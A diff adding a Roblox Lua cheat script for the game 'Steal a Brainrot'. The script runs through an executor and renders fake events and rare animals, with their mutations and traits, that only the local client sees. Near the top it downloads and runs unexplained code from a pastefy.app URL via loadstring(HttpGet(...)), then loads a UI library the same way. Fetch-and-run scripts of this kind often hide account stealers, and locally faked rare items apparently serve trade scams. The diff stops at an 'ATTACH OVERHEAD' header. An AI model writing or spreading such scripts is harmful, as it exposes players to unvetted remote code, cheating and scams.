@@ -1,0 +1,2157 @@
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+
+loadstring(game:HttpGet("https://pastefy.app/01jEp0El/raw"))()
+
+local Rayfield = loadstring(game:HttpGet('https://pastefy.app/da6JzdDQ/raw'))()
+
+-- =====================
+-- ALL SERVICES
+-- =====================
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local SoundService = game:GetService("SoundService")
+local TextChatService = game:GetService("TextChatService")
+local Debris = game:GetService("Debris")
+local CollectionService = game:GetService("CollectionService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+-- =====================
+-- REQUIRED MODULES
+-- =====================
+local Trove = require(ReplicatedStorage.Packages.Trove)
+local Observers = require(ReplicatedStorage.Packages.Observers)
+local Traits = require(ReplicatedStorage.Datas.Traits)
+local Mutations = require(ReplicatedStorage.Datas.Mutations)
+local TraitsPerAnimal = ReplicatedStorage.Models.TraitsPerAnimal
+local TraitModels = ReplicatedStorage.Models.Traits
+local TraitVfx = ReplicatedStorage.Vfx.Traits
+local MutSurfaces = ReplicatedStorage:WaitForChild("MutationSurfaces")
+local Vfx = ReplicatedStorage:WaitForChild("Vfx")
+
+local function attr(template, mutName)
+    return template:gsub("%*", mutName)
+end
+
+-- =====================
+-- DISPLAY DATA
+-- =====================
+local MutationDisplayData = {}
+for name, data in pairs(Mutations) do
+    MutationDisplayData[name] = {
+        DisplayText = data.DisplayText,
+        DisplayWithRichText = data.DisplayWithRichText,
+        Modifier = data.Modifier,
+    }
+end
+
+local TraitDisplayData = {}
+for name, data in pairs(Traits) do
+    TraitDisplayData[name] = {
+        Icon = data.Icon,
+        MultiplierModifier = data.MultiplierModifier,
+    }
+end
+
+-- =====================
+-- GLOBAL EFFECT RUNNERS (one heartbeat per effect type)
+-- =====================
+local globalEffectRunners = {}
+
+local function getOrStartEffectRunner(effectName, effectModule)
+    if not globalEffectRunners[effectName] then
+        local callbacks = {}
+        local conn = RunService.Heartbeat:Connect(function(dt)
+            local result = effectModule.simulate(dt)
+            for _, cb in pairs(callbacks) do
+                cb(result)
+            end
+        end)
+        globalEffectRunners[effectName] = {
+            conn = conn,
+            callbacks = callbacks,
+        }
+    end
+    return globalEffectRunners[effectName].callbacks
+end
+
+-- =====================
+-- RAYFIELD WINDOW
+-- =====================
+local Window = Rayfield:CreateWindow({
+    Name = "SS Steal a Brainrot Script | " .. executor,
+    LoadingTitle = "Steal a Brainrot | " .. executor,
+    LoadingSubtitle = "Loading...",
+    Icon = 119591742504251,
+    Theme = "Default",
+    ConfigurationSaving = { Enabled = false },
+    KeySystem = false,
+})
+
+-- =====================
+-- ROOT UI (Events)
+-- =====================
+local parent = player:WaitForChild("PlayerGui"):WaitForChild("ActiveEvents"):WaitForChild("ActiveEvents")
+
+local selectedEvent = nil
+local activeUIs = {}
+local baseOffset = 0
+local spacing = 0.02
+local timerDuration = 900
+
+local function format(t)
+    local m = math.floor(t / 60)
+    local s = t % 60
+    if m == 0 then return string.format("%02d", s) end
+    return string.format("%02d:%02d", m, s)
+end
+
+local function slideIn(main)
+    main.AnchorPoint = Vector2.new(0, 0)
+    main.Position = UDim2.new(0, 0, 1.5, 0)
+    TweenService:Create(main, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        { Position = UDim2.new(0, 0, 0, 0) }):Play()
+end
+
+local function startTimer(frame, main, text, duration)
+    if frame:GetAttribute("Running") then return end
+    frame:SetAttribute("Running", true)
+    local endTime = os.clock() + duration
+    local connection
+    connection = RunService.Heartbeat:Connect(function()
+        local remaining = math.ceil(endTime - os.clock())
+        if remaining <= 1 then
+            text.Text = "01"
+            frame:SetAttribute("Running", false)
+            connection:Disconnect()
+            for i, v in ipairs(activeUIs) do if v == frame then table.remove(activeUIs, i) break end end
+            TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+                { Position = UDim2.new(0, 0, 1.5, 0) }):Play()
+            task.wait(0.4)
+            frame.Visible = false
+            main.Visible = false
+            return
+        end
+        if math.floor(remaining / 60) == 0 then
+            text.Text = string.format("%02d", remaining)
+        else
+            text.Text = format(remaining)
+        end
+    end)
+end
+
+local function getActiveEvents()
+    local options = {}
+    for _, child in ipairs(parent:GetChildren()) do
+        if child:IsA("Frame") then table.insert(options, child.Name) end
+    end
+    return options
+end
+
+local function spawnEvent(eventName)
+    local frame = parent:FindFirstChild(eventName)
+    if not frame then return end
+    local main = frame:WaitForChild("Main")
+    local text = main:WaitForChild("TextLabel")
+    if table.find(activeUIs, frame) then return end
+    table.insert(activeUIs, frame)
+    local index = #activeUIs
+    frame.Visible = true
+    main.Visible = true
+    frame.ZIndex = 10 + index
+    main.AnchorPoint = Vector2.new(0, 0)
+    main.Position = UDim2.new(0, 0, 0, baseOffset + ((index - 1) * spacing))
+    slideIn(main)
+    startTimer(frame, main, text, timerDuration)
+end
+
+-- =====================
+-- TAB 1: EVENTS
+-- =====================
+local EventTab = Window:CreateTab("Events", 115001117876534)
+local eventOptions = getActiveEvents()
+if #eventOptions == 0 then eventOptions = {"No Active Events"} end
+EventTab:CreateSection("Events")
+EventTab:CreateParagraph({ Title = "Info", Content = "Use textbox to change timer duration." })
+EventTab:CreateInput({
+    Name = "Timer (seconds)",
+    PlaceholderText = "Enter time (e.g. 60, 120, 300)",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(value)
+        local num = tonumber(value)
+        if num and num > 0 then timerDuration = num end
+    end,
+})
+EventTab:CreateDropdown({
+    Name = "Select Event",
+    Options = eventOptions,
+    CurrentOption = {eventOptions[1]},
+    MultipleOptions = false,
+    Flag = "EventDropdown",
+    Callback = function(selected) selectedEvent = selected[1] end,
+})
+EventTab:CreateButton({
+    Name = "Spawn Event",
+    Callback = function()
+        if selectedEvent and selectedEvent ~= "No Active Events" then
+            spawnEvent(selectedEvent)
+            Rayfield:Notify({ Title = "Event Spawned", Content = "Timer: " .. timerDuration .. "s | " .. selectedEvent, Duration = 3 })
+        end
+    end,
+})
+EventTab:CreateButton({
+    Name = "Spawn All Events",
+    Callback = function()
+        for _, name in ipairs(getActiveEvents()) do
+            if name ~= "No Active Events" then spawnEvent(name) end
+        end
+        Rayfield:Notify({ Title = "All Events Spawned", Content = "Timer: " .. timerDuration .. "s", Duration = 3 })
+    end,
+})
+
+-- =====================
+-- TAB 2: SPAWNER
+-- =====================
+local SpawnerTab = Window:CreateTab("Spawner", 114748221761549)
+
+local function getAnimals()
+    local options = {}
+    local animalsModule = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
+    for name, data in pairs(animalsModule) do
+        if data.Rarity == "Secret" or data.Rarity == "OG" then
+            table.insert(options, { Name = name, Generation = data.Generation or 0 })
+        end
+    end
+    table.sort(options, function(a, b) return a.Generation > b.Generation end)
+    local sortedNames = {}
+    for _, item in ipairs(options) do table.insert(sortedNames, item.Name) end
+    return sortedNames
+end
+
+local animalOptions = getAnimals()
+if #animalOptions == 0 then animalOptions = {"No Animals Found"} end
+
+local mutationList = {"None"}
+for name, _ in pairs(Mutations) do table.insert(mutationList, name) end
+table.sort(mutationList)
+
+local traitList = {}
+for name, _ in pairs(Traits) do table.insert(traitList, name) end
+table.sort(traitList)
+
+local selectedAnimal = nil
+local selectedMutation = nil
+local selectedTraits = {}
+
+SpawnerTab:CreateSection("Animal Selection")
+SpawnerTab:CreateDropdown({
+    Name = "Animal",
+    Options = animalOptions,
+    CurrentOption = {animalOptions[1]},
+    MultipleOptions = false,
+    Flag = "AnimalDropdown",
+    Callback = function(selected) selectedAnimal = selected[1] end,
+})
+
+SpawnerTab:CreateSection("Mutation")
+SpawnerTab:CreateDropdown({
+    Name = "Mutation",
+    Options = mutationList,
+    CurrentOption = {},
+    MultipleOptions = false,
+    Flag = "MutationDropdown",
+    Callback = function(selected)
+        local val = selected[1]
+        selectedMutation = (val == "None") and nil or val
+    end,
+})
+
+SpawnerTab:CreateSection("Traits")
+SpawnerTab:CreateDropdown({
+    Name = "Traits (select multiple)",
+    Options = traitList,
+    CurrentOption = {},
+    MultipleOptions = true,
+    Flag = "TraitDropdown",
+    Callback = function(selected) selectedTraits = selected end,
+})
+SpawnerTab:CreateButton({
+    Name = "Clear Traits",
+    Callback = function()
+        selectedTraits = {}
+        Rayfield:Notify({ Title = "Traits Cleared", Content = "No traits will be applied.", Duration = 2 })
+    end,
+})
+
+-- ============================================================
+-- MUTATION APPLICATION
+-- ============================================================
+local function applyMutationToModel(model, animalName, mutationName)
+    if not model or not mutationName then return end
+    local trove = Trove.new()
+    trove:Add(model.AncestryChanged:Connect(function(_, parent)
+        if not parent then trove:Destroy() end
+    end))
+
+    local mutData = Mutations[mutationName]
+    if not mutData then return trove end
+
+    local mutSurface = MutSurfaces:FindFirstChild(animalName)
+    local paletteAttr = model:GetAttribute(attr("*Palette", mutationName)) or model:GetAttribute("Palette") or 1
+    local paletteIdx = tonumber(paletteAttr) or 1
+    local safeIdx = (mutData.Palettes and mutData.Palettes[paletteIdx]) and paletteIdx or 1
+    local skipped = {}
+
+    local function ignoreColor(part)
+        local a = part:GetAttribute(attr("*IgnoreColor", mutationName))
+        if a == false then return false end
+        return part:GetAttribute("IgnoreColor") or a
+    end
+
+    local function doPalettePass()
+        local palette = mutData.Palettes[safeIdx]
+        for _, part in model:GetDescendants() do
+            if part:IsA("BasePart") and not ignoreColor(part) then
+                local colorAttr = part:GetAttribute(attr("*Color", mutationName)) or part:GetAttribute("Color") or 1
+                local colorIdx = tonumber(colorAttr) or 1
+                local color = palette[colorIdx] or palette[math.clamp(colorIdx, 1, #palette)]
+
+                if part:GetAttribute("Neon") then
+                    local oldMat = part.Material
+                    part.Material = Enum.Material.Neon
+                    trove:Add(function() part.Material = oldMat end)
+                end
+
+                local sa = part:FindFirstChildOfClass("SurfaceAppearance")
+                if sa then
+                    sa:Destroy()
+                    if mutSurface then
+                        local newSa = trove:Clone(mutSurface)
+                        newSa.Color = (mutationName == "Divine") and palette[1] or color
+                        newSa.Parent = part
+                    end
+                    trove:Add(function()
+                        local existing = part:FindFirstChildOfClass("SurfaceAppearance")
+                        if existing then existing:Destroy() end
+                        sa:Clone().Parent = part
+                    end)
+                else
+                    local oldVariant = part.MaterialVariant
+                    if oldVariant == "Strawberry Stud Light" or oldVariant == "Strawberry Stud Dark" then
+                        skipped[part] = true
+                        part.MaterialVariant = attr("* Strawberry Stud Light", mutationName)
+                        trove:Add(function() part.MaterialVariant = oldVariant end)
+                    else
+                        local oldColor = part.Color
+                        part.Color = color
+                        trove:Add(function() part.Color = oldColor end)
+                    end
+                end
+            end
+        end
+    end
+
+    local function doVfxAndTag()
+        local vfxFolder = Vfx:FindFirstChild(mutationName)
+        local vfxInstance = model:FindFirstChild("VfxInstance")
+        if vfxFolder and vfxInstance then
+            for _, vfx in vfxFolder:GetChildren() do
+                trove:Clone(vfx).Parent = vfxInstance
+            end
+        end
+        model:SetAttribute("__mutation", mutationName)
+        trove:Add(function() model:SetAttribute("__mutation", nil) end)
+    end
+
+    if mutationName == "Rainbow" then
+        trove:Add(function() model:RemoveTag("RainbowModel") end)
+        for _, part in model:GetDescendants() do
+            if part:IsA("BasePart") and not part:GetAttribute("IgnoreRainbowColor") then
+                local sa = part:FindFirstChildOfClass("SurfaceAppearance")
+                if sa then
+                    trove:Add(function()
+                        local existing = part:FindFirstChildOfClass("SurfaceAppearance")
+                        if existing then existing:Destroy() end
+                        sa:Clone().Parent = part
+                    end)
+                else
+                    local oldColor = part.Color
+                    trove:Add(function() part.Color = oldColor end)
+                    local oldVariant = part.MaterialVariant
+                    if oldVariant == "Strawberry Stud Light" or oldVariant == "Strawberry Stud Dark" then
+                        part.MaterialVariant = ""
+                        trove:Add(function() part.MaterialVariant = oldVariant end)
+                    end
+                end
+            end
+        end
+        model:AddTag("RainbowModel")
+        local heartbeat
+        heartbeat = RunService.Heartbeat:Connect(function()
+            local hue = tick() % 5 / 5
+            for _, tagged in CollectionService:GetTagged("RainbowModel") do
+                if tagged == model then
+                    for _, part in tagged:GetDescendants() do
+                        if part:IsA("BasePart") and not part:GetAttribute("IgnoreRainbowColor") and not part:FindFirstChildOfClass("SurfaceAppearance") then
+                            part.Color = Color3.fromHSV(hue, 1, 1)
+                        end
+                    end
+                end
+            end
+        end)
+        trove:Add(heartbeat)
+        return trove
+    end
+
+    if mutationName == "Lava" then
+        for _, part in model:GetDescendants() do
+            if part:IsA("BasePart") and not skipped[part] and not ignoreColor(part) then
+                if (part:GetAttribute(attr("*Color", mutationName)) or part:GetAttribute("Color")) == 1 then
+                    local oldMat = part.Material
+                    part.Material = Enum.Material.Neon
+                    trove:Add(function() part.Material = oldMat end)
+                end
+            end
+        end
+    elseif mutationName == "Galaxy" then
+        for _, part in model:GetDescendants() do
+            if part:IsA("BasePart") and not skipped[part] and not ignoreColor(part) then
+                if (part:GetAttribute(attr("*Color", mutationName)) or part:GetAttribute("Color")) == 1 then
+                    local oldMat = part.Material
+                    part.Material = Enum.Material.Neon
+                    trove:Add(function() part.Material = oldMat end)
+                end
+                local oldVariant = part.MaterialVariant
+                part.MaterialVariant = "Galaxy Stud"
+                trove:Add(function() part.MaterialVariant = oldVariant end)
+            end
+        end
+    elseif mutationName == "YinYang" then
+        for _, part in model:GetDescendants() do
+            if part:IsA("BasePart") and not skipped[part] and not ignoreColor(part) then
+                local colorVal = part:GetAttribute(attr("*Color", mutationName)) or part:GetAttribute("Color") or 1
+                if colorVal == 3 or colorVal == 4 then
+                    local oldMat = part.Material
+                    part.Material = Enum.Material.Neon
+                    trove:Add(function() part.Material = oldMat end)
+                end
+            end
+        end
+    elseif mutationName == "Radioactive" then
+        for _, part in model:GetDescendants() do
+            if part:IsA("BasePart") and not skipped[part] and not ignoreColor(part) then
+                local oldVariant = part.MaterialVariant
+                local oldMat = part.Material
+                local colorVal = part:GetAttribute(attr("*Color", mutationName)) or part:GetAttribute("Color") or 1
+                local neon = (colorVal == 2 and (safeIdx == 1 or safeIdx == 4)) or (colorVal == 2 and safeIdx == 5) or (colorVal == 6 and safeIdx == 5)
+                if neon then
+                    part.Material = Enum.Material.Neon
+                    trove:Add(function() part.Material = oldMat end)
+                end
+                local studAttr = part:GetAttribute(attr("*Stud", mutationName))
+                if studAttr == false or (part.MaterialVariant ~= "Custom Stud" and studAttr ~= true) or part:GetAttribute(attr("*Ignore", mutationName)) then
+                    if studAttr == false then
+                        part.MaterialVariant = ""
+                        trove:Add(function() part.MaterialVariant = oldVariant end)
+                    end
+                elseif part:GetAttribute(attr("*MaterialMode", mutationName)) == 2 or model:GetAttribute(attr("*MaterialMode", mutationName)) == 2 then
+                    local studName = (part:GetAttribute(attr("*Material", mutationName)) == 2 or model:GetAttribute(attr("*Material", mutationName)) == 2) and "Radioactive Stud" or "Radioactive Stud2"
+                    part.Material = Enum.Material.SmoothPlastic
+                    part.MaterialVariant = studName
+                    trove:Add(function() part.MaterialVariant = oldVariant; part.Material = oldMat end)
+                elseif colorVal ~= 2 and colorVal ~= 6 then
+                    local studName = (part:GetAttribute(attr("*Material", mutationName)) == 2 or model:GetAttribute(attr("*Material", mutationName)) == 2) and "Radioactive Stud" or "Radioactive Stud2"
+                    part.Material = Enum.Material.SmoothPlastic
+                    part.MaterialVariant = studName
+                    trove:Add(function() part.MaterialVariant = oldVariant; part.Material = oldMat end)
+                end
+            end
+        end
+    elseif mutationName == "Cursed" then
+        local zombieTrait = model:FindFirstChild("_Trait.Zombie")
+        if zombieTrait then zombieTrait:Destroy() end
+        for _, part in model:GetDescendants() do
+            if part:IsA("BasePart") and not skipped[part] and not ignoreColor(part) then
+                local oldVariant = part.MaterialVariant
+                local oldMat = part.Material
+                local oldColor = part.Color
+                local colorVal = part:GetAttribute(attr("*Color", mutationName)) or part:GetAttribute("Color") or 1
+                local neon = (colorVal == 2 and (safeIdx == 1 or safeIdx == 4)) or (colorVal == 2 and safeIdx == 5) or (colorVal == 6 and safeIdx == 5)
+                if neon then
+                    part.Material = Enum.Material.Neon
+                    trove:Add(function() part.Material = oldMat end)
+                end
+                local studAttr = part:GetAttribute(attr("*Stud", mutationName))
+                if studAttr == false or (part.MaterialVariant ~= "Custom Stud" and studAttr ~= true) or part:GetAttribute(attr("*Ignore", mutationName)) then
+                    if studAttr == false then
+                        part.MaterialVariant = ""
+                        trove:Add(function() part.MaterialVariant = oldVariant end)
+                    end
+                elseif colorVal ~= 2 and colorVal ~= 6 or studAttr == true then
+                    part.Material = Enum.Material.SmoothPlastic
+                    part.MaterialVariant = "Cursed Stud"
+                    part.Color = Color3.fromRGB(255, 23, 23)
+                    trove:Add(function() part.MaterialVariant = oldVariant; part.Material = oldMat; part.Color = oldColor end)
+                end
+                local sa = part:FindFirstChildOfClass("SurfaceAppearance")
+                if sa then
+                    if not part:GetAttribute(attr("*IgnoreSurfaceColor", mutationName)) then
+                        sa.Color = Color3.fromRGB(255, 23, 23)
+                    end
+                    if part:GetAttribute("IgnoreSurface") then
+                        sa:Destroy()
+                    end
+                end
+            end
+        end
+        local zombieFolder = ReplicatedStorage.Models.TraitsPerAnimal.Zombie:FindFirstChild(animalName)
+        if zombieFolder then
+            local zombieClone = trove:Clone(zombieFolder)
+            zombieClone.Name = "_Trait.Zombie"
+            zombieClone.Parent = model
+            local attached = {}
+            for _, piece in zombieClone:GetChildren() do
+                piece.Color = Color3.fromRGB(255, 23, 23)
+                local att = piece:FindFirstChildOfClass("Attachment")
+                if att then
+                    local target = attached[att.Name] or model:FindFirstChild(att.Name, true)
+                    if target then
+                        piece:PivotTo(target.WorldCFrame)
+                        attached[att.Name] = target
+                        local rc = Instance.new("RigidConstraint")
+                        rc.Attachment0 = att
+                        rc.Attachment1 = target
+                        rc.Parent = att
+                    else
+                        piece:Destroy()
+                    end
+                end
+            end
+        end
+    elseif mutationName == "Divine" then
+        local emissiveStrength = model:GetAttribute("EmissiveStrength") or 2
+        for _, desc in model:GetDescendants() do
+            if desc:IsA("SurfaceAppearance") then
+                local oldEmissive = desc.EmissiveStrength
+                desc.EmissiveStrength = emissiveStrength
+                trove:Add(function() desc.EmissiveStrength = oldEmissive end)
+            end
+            if desc:IsA("BasePart") and not skipped[desc] and not ignoreColor(desc) then
+                local oldMat = desc.Material
+                local oldVariant = desc.MaterialVariant
+                local colorVal = desc:GetAttribute(attr("*Color", mutationName)) or desc:GetAttribute("Color") or 1
+                local neon = (colorVal == 2 and (safeIdx == 1 or safeIdx == 4)) or (colorVal == 2 and safeIdx == 5) or (colorVal == 6 and safeIdx == 5)
+                if neon then
+                    desc.Material = Enum.Material.Neon
+                    trove:Add(function() desc.Material = oldMat end)
+                end
+                local studAttr = desc:GetAttribute(attr("*Stud", mutationName))
+                if studAttr == false or (desc.MaterialVariant ~= "Custom Stud" and studAttr ~= true) or desc:GetAttribute(attr("*Ignore", mutationName)) then
+                    if studAttr == false then
+                        desc.MaterialVariant = ""
+                        trove:Add(function() desc.MaterialVariant = oldVariant end)
+                    end
+                elseif desc:GetAttribute(attr("*MaterialMode", mutationName)) == 2 or model:GetAttribute(attr("*MaterialMode", mutationName)) == 2 then
+                    desc.Material = Enum.Material.SmoothPlastic
+                    desc.MaterialVariant = "Divine Stud"
+                    trove:Add(function() desc.MaterialVariant = oldVariant; desc.Material = oldMat end)
+                elseif colorVal ~= 2 and colorVal ~= 6 then
+                    desc.Material = Enum.Material.SmoothPlastic
+                    desc.MaterialVariant = "Divine Stud"
+                    trove:Add(function() desc.MaterialVariant = oldVariant; desc.Material = oldMat end)
+                end
+            end
+        end
+    end
+
+    if mutationName ~= "Rainbow" then
+        doPalettePass()
+        doVfxAndTag()
+    end
+
+    return trove
+end
+
+-- ============================================================
+-- TRAIT APPLICATION
+-- ============================================================
+local function applyTraitsToModel(model, animalName, traitsList)
+    if not model or #traitsList == 0 then return end
+    local trove = Trove.new()
+    trove:Add(model.AncestryChanged:Connect(function(_, parent)
+        if not parent then trove:Destroy() end
+    end))
+
+    local traitsSet = {}
+    for _, t in traitsList do traitsSet[t] = true end
+
+    local skibidiModel = traitsSet.Skibidi and ReplicatedStorage.Models.TraitsPerAnimal.Skibidi:FindFirstChild(animalName)
+
+    for _, traitName in traitsList do
+        local traitData = Traits[traitName]
+        if not traitData then continue end
+
+        local perAnimalFolder = TraitsPerAnimal:FindFirstChild(traitName)
+        if perAnimalFolder then
+            local perAnimalModel = perAnimalFolder:FindFirstChild(animalName)
+            if perAnimalModel and not model:FindFirstChild(("_Trait.%s"):format(traitName)) then
+                local clone = trove:Clone(perAnimalModel)
+                clone.Name = ("_Trait.%s"):format(traitName)
+                for _, child in clone:GetChildren() do
+                    local att = child:FindFirstChildOfClass("Attachment")
+                    if att then
+                        local target = model:FindFirstChild(att.Name, true)
+                        if target then
+                            local rc = Instance.new("RigidConstraint")
+                            rc.Attachment0 = att
+                            rc.Attachment1 = target
+                            rc.Parent = child
+                        end
+                    end
+                end
+                clone.Parent = model
+
+                local isPet = (traitName == "Jackolantern Pet" or traitName == "Reindeer Pet" or
+                               traitName == "Pink Egg" or traitName == "Blue Egg" or
+                               traitName == "Green Egg" or traitName == "Orange Egg")
+                local animator = isPet and clone:FindFirstChildWhichIsA("Animator", true)
+                if animator then
+                    animator:SetAttribute("Animation", ("Animations.Traits.%s"):format(traitName))
+                    animator:AddTag("ClientLoadAnimation")
+                    local animTrack = animator:LoadAnimation(ReplicatedStorage.Animations.Traits[traitName].Walk)
+                    trove:Add(function() animTrack:Stop(0); animTrack:Destroy() end)
+                    local speed = (traitName == "Pink Egg" or traitName == "Blue Egg" or traitName == "Green Egg" or traitName == "Orange Egg") and 2 or 1
+                    trove:Add(Observers.observeAttribute(model, "Walking", function(walking)
+                        if walking then
+                            if not animTrack.IsPlaying then animTrack:Play(0.2, 1, speed) end
+                        elseif animTrack.IsPlaying then
+                            animTrack:Stop()
+                        end
+                        return nil
+                    end))
+                end
+            end
+        end
+
+        local traitModel = TraitModels:FindFirstChild(traitName)
+        if traitModel then
+            local clone = trove:Clone(traitModel)
+            clone.Name = ("_Trait.%s"):format(traitName)
+            for _, piece in clone:GetChildren() do
+                local attached = false
+                for _, child in piece:GetChildren() do
+                    if child:IsA("Attachment") then
+                        local target = model:FindFirstChild(child.Name, true)
+                        if target then
+                            attached = true
+                            local offset = Vector3.new(0, 0, 0)
+                            if traitsSet.Halo and traitName ~= "Halo" then offset = offset + Vector3.new(0, -2, 0) end
+                            if (traitName == "10B" or traitName == "26") and traitsSet["10B"] then offset = offset + Vector3.new(0, -1.459, 0) end
+                            if (traitName == "Taco" or traitName == "10B" or traitName == "26") and traitsSet["RIP Gravestone"] then offset = offset + Vector3.new(0, -3.582, 0) end
+                            if (traitName == "Taco" or traitName == "10B" or traitName == "26" or traitName == "RIP Gravestone") and traitsSet["Matteo Hat"] then offset = offset + Vector3.new(0, -1.33, 0) end
+                            if (traitName == "Taco" or traitName == "10B" or traitName == "26" or traitName == "RIP Gravestone" or traitName == "Matteo Hat") and traitsSet["Santa Hat"] then offset = offset + Vector3.new(0, -1.534, 0) end
+                            if (traitName == "Taco" or traitName == "10B" or traitName == "26" or traitName == "RIP Gravestone" or traitName == "Matteo Hat" or traitName == "Santa Hat") and traitsSet["Witch Hat"] then offset = offset + Vector3.new(0, -2.45, 0) end
+                            if (traitName == "Taco" or traitName == "10B" or traitName == "26" or traitName == "RIP Gravestone" or traitName == "Matteo Hat" or traitName == "Santa Hat" or traitName == "Witch Hat") and traitsSet.Sombrero then offset = offset + Vector3.new(0, -2.728, 0) end
+                            if (traitName == "Taco" or traitName == "10B" or traitName == "26" or traitName == "RIP Gravestone" or traitName == "Matteo Hat" or traitName == "Santa Hat" or traitName == "Witch Hat" or traitName == "Sombrero") and traitsSet.Skibidi then
+                                local attachName = child.Name
+                                if not string.find(attachName, "Forward") then
+                                    local isThird = string.find(attachName, "Third")
+                                    local isSecond = string.find(attachName, "Second")
+                                    attachName = isThird and "ThirdForwardHatAttachment" or (isSecond and "SecondForwardHatAttachment" or "ForwardHatAttachment")
+                                end
+                                local skibidiAttach = skibidiModel and skibidiModel:FindFirstChild(attachName, true)
+                                if skibidiAttach then
+                                    local baseOff = -(skibidiAttach.Parent.Size.Y * 0.5) + skibidiAttach.Position.Y
+                                    offset = offset + Vector3.new(0, baseOff, 0)
+                                end
+                            end
+                            if offset ~= Vector3.new(0, 0, 0) then
+                                if traitName == "26" then offset = Vector3.new(0, 0, offset.Y) end
+                                child.Position = child.Position + offset
+                            end
+                            local rc = Instance.new("RigidConstraint")
+                            rc.Attachment0 = child
+                            rc.Attachment1 = target
+                            rc.Parent = piece
+                            if traitData.Modify then traitData.Modify(piece, child, target) end
+                        end
+                    end
+                end
+                if not attached then piece:Destroy() end
+            end
+            clone.Parent = model
+
+            if traitsSet.Lightning then
+                local anim = clone:FindFirstChildWhichIsA("Animator", true)
+                if anim then
+                    anim:SetAttribute("Animation", "Animations.Traits.Lightning")
+                    anim:AddTag("ClientLoadAnimation")
+                end
+            elseif traitsSet.Granny then
+                local anim = clone:FindFirstChildWhichIsA("Animator", true)
+                if anim then
+                    anim:SetAttribute("Animation", "Animations.Traits.Granny")
+                    anim:AddTag("ClientLoadAnimation")
+                end
+            end
+        end
+
+        local vfxFolder = TraitVfx:FindFirstChild(traitName)
+        if vfxFolder then
+            for _, vfxPart in vfxFolder:GetChildren() do
+                local target = model:FindFirstChild(vfxPart.Name)
+                if target then
+                    local clone = trove:Clone(vfxPart)
+                    clone.Massless = true
+                    clone.CanCollide = false
+                    clone.CanQuery = false
+                    clone.CanTouch = false
+                    clone.Transparency = 1
+                    clone.CFrame = target.CFrame
+                    local weld = Instance.new("WeldConstraint", clone)
+                    weld.Part0 = target
+                    weld.Part1 = clone
+                    clone.Parent = model
+                    clone.Name = ("_%s"):format(vfxPart.Name)
+                    if traitData.ModifyVFX then traitData.ModifyVFX(clone, target, animalName) end
+                end
+            end
+        end
+
+        if traitName == "Strawberry" then
+            for _, part in model:GetDescendants() do
+                if part:IsA("BasePart") then
+                    local oldVariant = part.MaterialVariant
+                    local oldColor = part.Color
+                    if part:HasTag("Strawberry") then
+                        part.Color = Color3.fromRGB(255,255,255)
+                        part.Material = Enum.Material.SmoothPlastic
+                        part.MaterialVariant = "Strawberry Stud Light"
+                        trove:Add(function() part.MaterialVariant = oldVariant; part.Color = oldColor end)
+                    elseif part:HasTag("Strawberry2") then
+                        part.Color = Color3.fromRGB(193,193,193)
+                        part.Material = Enum.Material.SmoothPlastic
+                        part.MaterialVariant = "Strawberry Stud Light"
+                        trove:Add(function() part.MaterialVariant = oldVariant; part.Color = oldColor end)
+                    elseif part:HasTag("Strawberry3") then
+                        part.Color = Color3.fromRGB(147,147,147)
+                        part.Material = Enum.Material.SmoothPlastic
+                        part.MaterialVariant = "Strawberry Stud Light"
+                        trove:Add(function() part.MaterialVariant = oldVariant; part.Color = oldColor end)
+                    end
+                end
+            end
+        elseif traitName == "Chocolate" then
+            local studName = (animalName == "Strawberry Elephant") and "Chocolate Strawberry Stud" or "Chocolate Stud"
+            for _, part in model:GetDescendants() do
+                if part:IsA("BasePart") then
+                    local oldVariant = part.MaterialVariant
+                    local oldColor = part.Color
+                    if part:HasTag("Strawberry") then
+                        part.Color = Color3.fromRGB(136,73,28)
+                        part.Material = Enum.Material.SmoothPlastic
+                        part.MaterialVariant = studName
+                        trove:Add(function() part.MaterialVariant = oldVariant; part.Color = oldColor end)
+                    elseif part:HasTag("Strawberry2") then
+                        part.Color = Color3.fromRGB(113,59,22)
+                        part.Material = Enum.Material.SmoothPlastic
+                        part.MaterialVariant = studName
+                        trove:Add(function() part.MaterialVariant = oldVariant; part.Color = oldColor end)
+                    elseif part:HasTag("Strawberry3") then
+                        part.Color = Color3.fromRGB(91,46,16)
+                        part.Material = Enum.Material.SmoothPlastic
+                        part.MaterialVariant = studName
+                        trove:Add(function() part.MaterialVariant = oldVariant; part.Color = oldColor end)
+                    end
+                end
+            end
+        elseif traitName == "Lucky" then
+            for _, part in model:GetDescendants() do
+                if part:IsA("BasePart") then
+                    local oldVariant = part.MaterialVariant
+                    local oldColor = part.Color
+                    if part:HasTag("Strawberry") or part:HasTag("Strawberry2") then
+                        part.Color = Color3.fromRGB(255,255,255)
+                        part.Material = Enum.Material.SmoothPlastic
+                        part.MaterialVariant = "Clover Stud"
+                        trove:Add(function() part.MaterialVariant = oldVariant; part.Color = oldColor end)
+                    elseif part:HasTag("Strawberry3") then
+                        part.Color = Color3.fromRGB(255,255,255)
+                        part.Material = Enum.Material.SmoothPlastic
+                        part.MaterialVariant = "Clover Stud2"
+                        trove:Add(function() part.MaterialVariant = oldVariant; part.Color = oldColor end)
+                    end
+                end
+            end
+        end
+    end
+
+    if animalName == "Rosey and Teddy" and traitsSet["Matteo Hat"] then
+        for _, part in model:GetChildren() do
+            if part:IsA("BasePart") and part.Transparency < 1 then
+                local oldTrans = part.Transparency
+                part.Transparency = 1
+                trove:Add(function() part.Transparency = oldTrans end)
+            end
+        end
+        local matteoModel = script:FindFirstChild("MatteoHat_Rosey and Teddy")
+        if matteoModel then
+            local clone = trove:Clone(matteoModel)
+            local mutation = model:GetAttribute("__mutation")
+            if mutation then
+                applyMutationToModel(clone, animalName, mutation)
+            end
+            if clone:FindFirstChild("AnimationController") then clone.AnimationController:Destroy() end
+            local weld = Instance.new("Weld")
+            weld.Part0 = clone.PrimaryPart
+            weld.Part1 = model.PrimaryPart
+            weld.Parent = clone
+            clone.Parent = model
+        end
+    end
+
+    return trove
+end
+
+-- ============================================================
+-- ATTACH OVERHEAD
+-- ============================================================
